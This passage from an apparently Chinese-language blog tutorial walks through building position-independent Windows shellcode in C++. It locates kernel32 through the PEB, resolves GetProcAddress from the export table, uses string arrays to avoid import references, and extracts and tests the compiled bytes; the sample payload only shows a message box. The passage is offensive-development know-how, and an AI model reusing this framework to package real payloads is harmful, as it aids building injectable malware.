(!lpNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!lpNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY lpExports = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hModuleBase + (DWORD)lpNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">    PDWORD lpdwFunName = (PDWORD)((DWORD)hModuleBase + (DWORD)lpExports-&gt;AddressOfNames);</span><br><span class="line">    PWORD lpword = (PWORD)((DWORD)hModuleBase + (DWORD)lpExports-&gt;AddressOfNameOrdinals);</span><br><span class="line">    PDWORD lpdwFunAddr = (PDWORD)((DWORD)hModuleBase + (DWORD)lpExports-&gt;AddressOfFunctions);</span><br><span class="line"></span><br><span class="line">    DWORD dwLoop = <span class="number">0</span>;</span><br><span class="line">    FARPROC pRet = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (; dwLoop &lt;= lpExports-&gt;NumberOfNames - <span class="number">1</span>; dwLoop++) &#123;</span><br><span class="line">        <span class="keyword">char</span>* pFunName = (<span class="keyword">char</span>*)(lpdwFunName[dwLoop] + (DWORD)hModuleBase);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pFunName[<span class="number">0</span>] == <span class="string">&#x27;G&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">2</span>] == <span class="string">&#x27;t&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">3</span>] == <span class="string">&#x27;P&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">4</span>] == <span class="string">&#x27;r&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">5</span>] == <span class="string">&#x27;o&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">6</span>] == <span class="string">&#x27;c&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">7</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">8</span>] == <span class="string">&#x27;d&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">9</span>] == <span class="string">&#x27;d&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">10</span>] == <span class="string">&#x27;r&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">11</span>] == <span class="string">&#x27;e&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">12</span>] == <span class="string">&#x27;s&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">13</span>] == <span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            pRet = (FARPROC)(lpdwFunAddr[lpword[dwLoop]] + (DWORD)hModuleBase);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下图</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/42.png?raw=true" alt="image-20200419203622478"></p><p>接下来我们来提取进程中的shellcode段，首先用PEID来看看文件的偏移点</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/43.png?raw=true" alt="image-20200419204935411"></p><p>我们用16进制进制来看看shellcode代码段，如图所示从200-5D7都是我们shellcode</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/44.png?raw=true" alt="image-20200419221130197"></p><p>我们把这段代码复制下来另存为一个文件</p><p>然后我们用shellcode加载器加载他，看下是否成功</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/45.gif?raw=true" alt="1"></p><h2 id="函数生成规律"><a href="#函数生成规律" class="headerlink" title="函数生成规律"></a>函数生成规律</h2><h4 id="单文件函数生成规律"><a href="#单文件函数生成规律" class="headerlink" title="单文件函数生成规律"></a>单文件函数生成规律</h4><p>先说结论：</p><ul><li>在单个文件中，函数的生成顺序和函数书写的顺序相关，和函数声明的位置不想关</li></ul><p>首先验证我们结论，我们看下面两张图</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/46.png?raw=true" alt="image-20200420215258991"></p><p>第二张图我们把<strong>b</strong>函数放到<strong>MyMain</strong>函数上面，其他的不变</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/47.png?raw=true" alt="image-20200420220008795"></p><p>可以看到我们的结论是完全正确的！！</p><h4 id="多文件函数生成规律"><a href="#多文件函数生成规律" class="headerlink" title="多文件函数生成规律"></a>多文件函数生成规律</h4><p>首先直接来结论：</p><ul><li><p>文件生成顺序和头文件引用顺序无关，只和工程项目<code>vcxproj</code>结尾的文件相关</p></li><li><p>如果有多个文件，并且多个文件里面有多个函数，那么函数生成的顺序第一优先级为<code>vcxproj</code>书写的顺序相关，第二优先级只和<code>cpp</code>文件中书写函数的顺序相关，举个例子<code>vcxproj</code>文件中顺序为<code>a.cpp</code> <code>dome.cpp</code> <code>b.cpp</code>，并且<code>a.cpp</code>文件中有两个函数<code>a</code>和 <code>c</code>，<code>b.cpp</code>文件只有<code>b</code>函数，<code>dome.cpp</code>文件只有<code>MyMain</code>函数，那么函数排列的顺序就是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a函数-&gt;c函数-&gt;MyMain函数-&gt;b函数</span><br></pre></td></tr></table></figure></li></ul><p>首先我们来验证第一条结论</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/48.png?raw=true" alt="image-20200420223622886"></p><p>用IDA来查看</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/49.png?raw=true" alt="image-20200420224120045"></p><p>接着我们来修改<code>vcxproj</code>文件中文件中的位置，可以发现论证成立</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/50.png?raw=true" alt="image-20200420224649670"></p><p>接着我们来验证第二个结论，可见结论完全正确</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/51.png?raw=true" alt="image-20200420230609726"></p><h2 id="编写Shellcode"><a href="#编写Shellcode" class="headerlink" title="编写Shellcode"></a>编写Shellcode</h2><p>首先vs文件创建排序是按数字其次才是字母排序，编译顺序也是如此（0-9-a-z)</p><p>首先我们创建一侧项目，然后按上面的要求来配置我们的文件，最后我们可以得到一个入下图所示的解决方案</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/52.png?raw=true" alt="image-20200426224531306"></p><p>我们只需要把代码放到<code>z.end.cpp</code>和<code>a.start.cpp</code>之间即可</p><p>首先我们贴<code>0.main.cpp</code>的代码，由于该函数不需要加载在shellcode中，所以我们可以按照正常的写法来写，然后获取<strong>ShellcodeEnd</strong>函数还有<strong>ShellcodeStart</strong>函数使他们相减即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;statement.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/entry:MyMain&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyMain</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CreateShellcode();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateShellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">HMODULE hMsvcrt = LoadLibraryA(<span class="string">&quot;msvcrt.dll&quot;</span>);</span><br><span class="line">HANDLE hBin = CreateFileA(<span class="string">&quot;sh.bin&quot;</span>, GENERIC_ALL, <span class="number">0</span>, <span class="literal">NULL</span>, CREATE_ALWAYS, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hBin == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwSize = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;</span><br><span class="line">DWORD dwWrite;</span><br><span class="line">WriteFile(hBin, ShellcodeStart, dwSize, &amp;dwWrite, <span class="literal">NULL</span>);</span><br><span class="line">CloseHandle(hBin);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着我们来定义<code>api.h</code>头文件，这个文件都存放着我们所有的动态调用的api类，定义好动态调用的类后我们把它用<strong>typedef</strong>来集合起来，看不懂的可以看我原来搬运的一篇文章</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* FN_GetProcAddress)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">__in HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">__in LPCSTR lpProcName</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HMODULE</span><span class="params">(WINAPI* FN_LoadLibraryA)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">__in LPCSTR lpLibFileName</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">(WINAPI* FN_MessageBoxA)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">__in_opt HWND hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">__in_opt LPCSTR lpText,</span></span></span><br><span class="line"><span class="function"><span class="params">__in_opt LPCSTR lpCaption,</span></span></span><br><span class="line"><span class="function"><span class="params">__in UINT uType)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* FN_CreateFileA)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">__in     LPCSTR lpFileName,</span></span></span><br><span class="line"><span class="function"><span class="params">__in     DWORD dwDesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">__in     DWORD dwShareMode,</span></span></span><br><span class="line"><span class="function"><span class="params">__in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">__in     DWORD dwCreationDisposition,</span></span></span><br><span class="line"><span class="function"><span class="params">__in     DWORD dwFlagsAndAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">__in_opt HANDLE hTemplateFile</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">FUNCTIONS</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">FN_GetProcAddress  fn_GetProcAddress;</span><br><span class="line">FN_LoadLibraryA  fn_LoadLibraryA;</span><br><span class="line">FN_MessageBoxA  fn_MessageBoxA;</span><br><span class="line">FN_CreateFileA fn_CreateFileA;</span><br><span class="line"></span><br><span class="line">&#125;FUNCTIONS, * PFUNCTIONS;</span><br></pre></td></tr></table></figure><p>接着是<code>statement.h</code>头文件，这个文件声明了我们所有自定义的函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;api.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShellcodeStart</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShellcodeEntry</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShellcodeEnd</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateShellcode</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitFunctions</span><span class="params">(PFUNCTIONS pFn)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateConfigFile</span><span class="params">(PFUNCTIONS pFn)</span></span>;</span><br></pre></td></tr></table></figure><p>接着是<code>a.start.cpp</code>文件，首先需要定一个<strong>ShellcodeStart</strong>函数，这个函数是我们所有代码的入口，一个<code>jmp</code>的汇编命令，该命令跳转到的我们真正的起始函数中，接下来就是获取基址，以及一些动态调用的赋值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;statement.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;api.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">ShellcodeStart</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">jmp ShellcodeEntry</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取系统中kernel32.dll基址的方法</span></span><br><span class="line">__declspec(naked) <span class="function">DWORD <span class="title">getKernel32</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax, fs: [<span class="number">030</span>h] ;</span><br><span class="line">test eax, eax;</span><br><span class="line">js finished;</span><br><span class="line">mov eax, [eax + <span class="number">0</span>ch];</span><br><span class="line">mov eax, [eax + <span class="number">14</span>h];</span><br><span class="line">mov eax, [eax];</span><br><span class="line">mov eax, [eax]</span><br><span class="line">mov eax, [eax + <span class="number">10</span>h]</span><br><span class="line">finished:</span><br><span class="line">ret</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取GetProcAddress函数地址</span></span><br><span class="line"><span class="function">FARPROC <span class="title">getProcAddress</span><span class="params">(HMODULE hModuleBase)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">FARPROC pRet = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_DOS_HEADER lpDosHeader;</span><br><span class="line">PIMAGE_NT_HEADERS32 lpNtHeaders;</span><br><span class="line">PIMAGE_EXPORT_DIRECTORY lpExports;</span><br><span class="line">PWORD lpwOrd;</span><br><span class="line">PDWORD lpdwFunName;</span><br><span class="line">PDWORD lpdwFunAddr;</span><br><span class="line">DWORD dwLoop;</span><br><span class="line"></span><br><span class="line">lpDosHeader = (PIMAGE_DOS_HEADER)hModuleBase;</span><br><span class="line">lpNtHeaders = (PIMAGE_NT_HEADERS)((DWORD)hModuleBase + lpDosHeader-&gt;e_lfanew);</span><br><span class="line"><span class="keyword">if</span> (!lpNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> pRet;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!lpNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> pRet;</span><br><span class="line">&#125;</span><br><span class="line">lpExports = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hModuleBase + (DWORD)lpNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line"><span class="keyword">if</span> (!lpExports-&gt;NumberOfNames)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> pRet;</span><br><span class="line">&#125;</span><br><span class="line">lpdwFunName = (PDWORD)((DWORD)hModuleBase + (DWORD)lpExports-&gt;AddressOfNames);</span><br><span class="line">lpwOrd = (PWORD)((DWORD)hModuleBase + (DWORD)lpExports-&gt;AddressOfNameOrdinals);</span><br><span class="line">lpdwFunAddr = (PDWORD)((DWORD)hModuleBase + (DWORD)lpExports-&gt;AddressOfFunctions);</span><br><span class="line"><span class="keyword">for</span> (dwLoop = <span class="number">0</span>; dwLoop &lt;= lpExports-&gt;NumberOfNames - <span class="number">1</span>; dwLoop++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span>* pszFunction = (<span class="keyword">char</span>*)(lpdwFunName[dwLoop] + (DWORD)hModuleBase);</span><br><span class="line"><span class="keyword">if</span> (pszFunction[<span class="number">0</span>] == <span class="string">&#x27;G&#x27;</span></span><br><span class="line">&amp;&amp; pszFunction[<span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span></span><br><span class="line">&amp;&amp; pszFunction[<span class="number">2</span>] == <span class="string">&#x27;t&#x27;</span></span><br><span class="line">&amp;&amp; pszFunction[<span class="number">3</span>] == <span class="string">&#x27;P&#x27;</span></span><br><span class="line">&amp;&amp; pszFunction[<span class="number">4</span>] == <span class="string">&#x27;r&#x27;</span></span><br><span class="line">&amp;&amp; pszFunction[<span class="number">5</span>] == <span class="string">&#x27;o&#x27;</span></span><br><span class="line">&amp;&amp; pszFunction[<span class="number">6</span>] == <span class="string">&#x27;c&#x27;</span></span><br><span class="line">&amp;&amp; pszFunction[<span class="number">7</span>] == <span class="string">&#x27;A&#x27;</span></span><br><span class="line">&amp;&amp; pszFunction[<span class="number">8</span>] == <span class="string">&#x27;d&#x27;</span></span><br><span class="line">&amp;&amp; pszFunction[<span class="number">9</span>] == <span class="string">&#x27;d&#x27;</span></span><br><span class="line">&amp;&amp; pszFunction[<span class="number">10</span>] == <span class="string">&#x27;r&#x27;</span></span><br><span class="line">&amp;&amp; pszFunction[<span class="number">11</span>] == <span class="string">&#x27;e&#x27;</span></span><br><span class="line">&amp;&amp; pszFunction[<span class="number">12</span>] == <span class="string">&#x27;s&#x27;</span></span><br><span class="line">&amp;&amp; pszFunction[<span class="number">13</span>] == <span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">pRet = (FARPROC)(lpdwFunAddr[lpwOrd[dwLoop]] + (DWORD)hModuleBase);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> pRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitFunctions</span><span class="params">(PFUNCTIONS pFn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//获取LoadLibraryA函数的地址</span></span><br><span class="line">pFn-&gt;fn_GetProcAddress = (FN_GetProcAddress)getProcAddress((HMODULE)getKernel32());</span><br><span class="line"><span class="keyword">char</span> szLoadLibraryA[] = &#123; <span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line">pFn-&gt;fn_LoadLibraryA = (FN_LoadLibraryA)pFn-&gt;fn_GetProcAddress((HMODULE)getKernel32(), szLoadLibraryA);</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用LoadLibrary函数载入User32.dll，然后在里面搜寻MessageBoxA函数的地址</span></span><br><span class="line"><span class="keyword">char</span> szUser32[] = &#123; <span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> szMessageBoxA[] = &#123; <span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line">pFn-&gt;fn_MessageBoxA = (FN_MessageBoxA)pFn-&gt;fn_GetProcAddress(pFn-&gt;fn_LoadLibraryA(szUser32), szMessageBoxA);</span><br><span class="line"></span><br><span class="line"><span class="comment">//在Kernel32.dll中找到CreateFileA函数的地址</span></span><br><span class="line"><span class="keyword">char</span> szCreateFileA[] = &#123; <span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line">pFn-&gt;fn_CreateFileA = (FN_CreateFileA)pFn-&gt;fn_GetProcAddress((HMODULE)getKernel32(), szCreateFileA);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShellcodeEntry</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">FUNCTIONS fn;</span><br><span class="line">InitFunctions(&amp;fn);</span><br><span class="line">CreateConfigFile(&amp;fn);</span><br><span class="line"></span><br><span class="line"><span class="comment">//举例子想再写一个获得系统信息的函数则可以这样写</span></span><br><span class="line"><span class="comment">//GetSystemInfos(&amp;fn);//然后去b.work定义函数，在header.h中声明函数，</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>b.code.cpp</code>这个文件是我们所有的函数使用，如果还想加函数使用之类的都可以写在这边，然后在<code>a.start.cpp</code>中的  <strong>ShellcodeEntry</strong>函数调用即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;statement.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;api.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateConfigFile</span><span class="params">(PFUNCTIONS pFn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//MessageBoxA(NULL, &quot;Hello world&quot;, &quot;tip&quot;, MB_OK);</span></span><br><span class="line"><span class="keyword">char</span> szHello[] = &#123; <span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;，&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> szTip[] = &#123; <span class="string">&#x27;啊&#x27;</span>,<span class="string">&#x27;巴&#x27;</span>,<span class="string">&#x27;啊&#x27;</span>,<span class="string">&#x27;巴&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line">pFn-&gt;fn_MessageBoxA(<span class="literal">NULL</span>, szHello, szTip, MB_OK);</span><br><span class="line"><span class="comment">//CreateFileA(&quot;1.txt&quot;, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);</span></span><br><span 